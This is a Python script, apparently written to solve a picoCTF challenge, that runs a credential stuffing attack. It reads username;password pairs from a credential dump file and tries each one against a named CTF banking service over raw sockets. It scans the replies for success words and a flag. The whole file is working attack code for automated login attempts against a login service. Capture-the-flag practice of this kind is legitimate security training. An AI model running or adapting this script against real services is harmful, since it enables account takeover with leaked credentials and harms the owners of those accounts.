"""Credential stuffing attack against picoCTF banking service."""
import socket
import sys
import re
import time

HOST = "crystal-peak.picoctf.net"
PORT = 52020
CREDS_FILE = "creds-dump.txt"

def try_credential(username, password, timeout=3):
    """Try a single credential pair. Returns (success, response)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        # Read until "Username: "
        data = b""
        while b"Username: " not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        # Send username
        s.sendall((username + "\n").encode())
        # Read until "Password: "
        while b"Password: " not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        # Send password
        s.sendall((password + "\n").encode())
        # Read response
        time.sleep(0.3)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        s.close()
        full = (data + response).decode("utf-8", errors="replace")
        return full
    except Exception as e:
        return f"ERROR: {e}"

# Read credentials
creds = []
with open(CREDS_FILE, "r", errors="replace") as f:
    for line in f:
        line = line.strip()
        if ";" in line:
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))

print(f"[*] Loaded {len(creds)} credential pairs")
print(f"[*] Starting credential stuffing attack...")

# Try each credential
found = False
for i, (user, pwd) in enumerate(creds):
    if i % 100 == 0:
        print(f"  [{i}/{len(creds)}] Trying {user}:{pwd}...")
    response = try_credential(user, pwd)
    # Check for success indicators
    if any(s in response.lower() for s in ["flag", "picoctf{", "welcome", "success", "granted", "authenticated", "logged in"]):
        if "invalid" not in response.lower() and "failed" not in response.lower():
            print(f"\n[+] HIT at #{i}: {user}:{pwd}")
            print(f"    Response: {response[:500]}")
            # Look for flag
            flag_match = re.search(r'picoCTF\{[^}]+\}', response)
            if flag_match:
                print(f"\n[+] FLAG: {flag_match.group()}")
                found = True
                break
    # Also check for "incorrect" or "invalid" to skip quickly
    if "invalid" in response.lower() or "incorrect" in response.lower() or "failed" in response.lower():
        continue

if not found:
    print("\n[-] No flag found in any response")
    print("    Last response:", response[:300] if 'response' in dir() else "N/A")
